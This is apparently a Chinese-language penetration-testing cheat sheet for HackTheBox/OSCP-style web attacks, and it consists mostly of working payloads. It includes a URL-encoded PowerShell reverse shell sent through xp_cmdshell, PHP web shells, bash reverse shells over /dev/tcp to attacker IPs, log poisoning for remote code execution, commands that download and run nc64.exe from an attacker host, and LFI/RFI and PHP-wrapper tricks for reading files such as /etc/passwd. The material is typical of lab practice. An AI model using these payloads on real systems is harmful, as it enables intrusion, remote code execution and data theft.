HTTP（Hypertext Transfer Protocol）通信的默认端口
没有思路可以尝试从头枚举，使用不同的目录爆破工具

**如果有.git 目录暴露出来：可以使用**
```bash
wget -r http:/xxxxxxxxxx/.git/
然后进入目录使用 git show 就可以查看被修改过的数据内容

查找字符串: find * | grep -iR passw
```


**PHP cli server**
PHP 内置的命令行开发服务器 
```bash
php -S 127.0.0.1:80
```


**Apache 的配置文件夹，网站运行的所有者；开放在哪个端口**
```
/etc/apache2/sites-enabled
```


 **爆破子域名**
```
wfuzz -u [URL] -H "HOST: FUZZ.xxxxxxx" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw [xx]
```
例: `wfuzz -u https://streamio.htb -H "HOST: FUZZ.streamio.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 24 `

```bash
ffuf -u http://10.129.246.74 -H "Host: FUZZ.usage.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ac
```


**Curl**
```bash
curl -X OPTIONS http://192.168.55.21/test/ -vv
```
-b 指定 Cookie 
-k 忽略证书
-d 设置 POST 请求中的数据


**webdav:**
```bash
检测webdav 
davtest -url <url> -auth user:password   
-auth+ 	Authorization (user:password)
-url+		url of DAV location

nikto显示： OPTIONS: WebDAV enabled (MKCOL LOCK COPY PROPPATCH PROPFIND UNLOCK listed as allowed).
```

```bash
cadaver <url> 
```
上传文件
```bash
put ./reverse-tcp-shell.php
```


**创建字典**
```bash
cewl URL [--with-numbers] > wordlists
```


**枚举和滥用 API**
Gobuster 爆破 API
- txt
```txt
{GOBUSTER}/v1
{GOBUSTER}/v2
```

```
gobuster dir -u <URL> -w <PATH> -p txt
```
可以枚举到 username，拼接路径继续爆破
```
<URL/xxx/v1/username/>
```


#### 脚本
枚举 YYYY-MM-DD-updata.pdf 类型的 URL , 并且指定关键词
```python
#!/usr/bin/env python3

import datetime
import io
import PyPDF2
import requests


t = datetime.datetime(2020, 1, 1)
end = datetime.datetime(2021, 7, 4)
keywords = ['user', 'password', 'account', 'intelligence', 'htb', 'login', 'service', 'new']
users = set()

while True:
    url = t.strftime("http://intelligence.htb/documents/%Y-%m-%d-upload.pdf")
    resp = requests.get(url)
    if resp.status_code == 200:
        with io.BytesIO(resp.content) as data:
            pdf = PyPDF2.PdfFileReader(data)
            users.add(pdf.getDocumentInfo()['/Creator'])
            for page in range(pdf.getNumPages()):
                text = pdf.getPage(page).extractText()
                if any([k in text.lower() for k in keywords]):
                    print(f'==={url}===\n{text}')
    t = t + datetime.timedelta(days=1)
    if t >= end:
        break

with open('users', 'w') as f:
    f.write('\n'.join(users)) 
```


**Windows Web 反弹 shell**
```powershell
3%3bexecute+xp_cmDshElL+'C%3a\windows\syswow64\windowspowershell\v1.0\powershell.exe+"$client+%3d+new-object+system.net.sockets.tcpclient(\"10.10.14.29\",443)%3b$stream+%3d+$client.getstream()%3b[byte[]]$bytes+%3d+0..65535|%25{0}%3bwhile(($i+%3d+$stream.read($bytes,+0,+$bytes.length))+-ne+0){%3b$data+%3d+(new-object+-typename+system.text.asciiencoding).getstring($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+out-string+)%3b$sendback2+%3d+$sendback+%2b+\"PS+\"+%2b+(pwd).path+%2b+\"^>+\"%3b$sendbyte+%3d+([text.encoding]%3a%3aascii).getbytes($sendback2)%3b$stream.write($sendbyte,0,$sendbyte.length)%3b$stream.flush()}%3b$client.close()"'%3b
```

**上传 shell 文件的时候一定要注意，IIS 无法执行 php 代码，可以选择 aspx 的 revshell**




# 文件包含 

直接执行反弹 shell 命令
```
data:text/plain,<?php passthru("bash -i >& /dev/tcp/X.X.X.X/4444 0>&1"); ?>
data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls
```

读取文件
```bash
file:///etc/passwd
```

文件包含不起效果，尝试把 `?cmd=id` 换成 `&cmd=id`

**php 文件包含代码**
```php
<?php system($_GET['cmd']); ?>
<?php system($_REQUEST['cmd']); ?>
```

```php
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```



- **获得 shell 拿 www-data , php 文件包含不起作用时**
可以尝试写入 
```bash
/var/crash
/var/tmp
?cmd 和 &cmd 都尝试一下
```


**本地文件包含可以考虑包含日志文件**
```
../../../../../../../../../var/log/apache2/access.log
/var/log/nginx/access.log
../../../../../../../../../xampp/apache/logs/access.log (windows)
```
访问一个站点，bp 抓包，修改 User-Agent，即存入日志文件   (直接 GET 在 URL 访问要包含的 php 代码也可以)
```bash
User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>

GET /xxx.php?file=<?php system($_GET['cmd']); ?> HTTP/1.1
```
再次包含日志文件就可以 RCE  **(注意使用& 而不是 ?)**
```
../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.229%2F2233%200%3E%261%22
```


**判断是否调用 curl , 如调用可以上传 php 代码执行:**
```
[curl] http://10.10.14.14/cmd.php -o uploads/cmd.php
```


- 包含用户家目录的 `.bash_history` ?


**本地文件包含+zip 上传：**
https://medium.com/@ardian.danny/oscp-practice-series-62-proving-grounds-zipper-b49a52ed8e38
创建一个 rev.php
```bash
<IP>//uploads/upload_1719737964.zip   (上传php文件后拿到路径名字)
zip://uploads/upload_1719737964.zip%23rev   (文件包含访问)   (不需要加.php后缀)
```


**wfuzz 模糊测试本地文件包含**
```bash
wfuzz -c -z file,/path/to/wordlist -u "http://target.com/page?file=FUZZ"
```


#### Windows
一般 LFI 测试的文件是 `C:\Windows\win.ini`

- shell.php
```php
system("powershell -c wget 10.10.14.14/nc64.exe -outfile \\programdata\\nc64.exe");
system("\\programdata\\nc64.exe -e powershell 10.10.14.14 2233");
```




如果尝试 RFI 无果，可以尝试
[0x34 Sniper (RFI shell,武器化.chm)](../../0x0B%20HackTheBox%20WP/靶机推荐第五组%2081-120暨内⽹和域渗透学习路径/0x34%20Sniper%20(RFI%20shell,武器化.chm).md)
修改/etc/samba/smb.conf 文件
```
[htb]
   comment = Test
   path = /srv/smb
   guest ok = yes
   browseable = yes
   create mask = 0600
   directory mask = 0700
```
![](photos/Pasted%20image%2020240311200806.png)
启动 smbd 服务
```
systemctl start smbd
```
URL 访问
```
http://10.129.229.6/blog/?lang=\\10.10.14.29\htb\1.txt
```
![](photos/Pasted%20image%2020240311201155.png)










##  php 伪协议
**读取文件 base64编码绕过**
```bash
php://filter/convert.base64-encode/resource=config.php
```

**执行 data 数据流命令**
```bash
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls
```
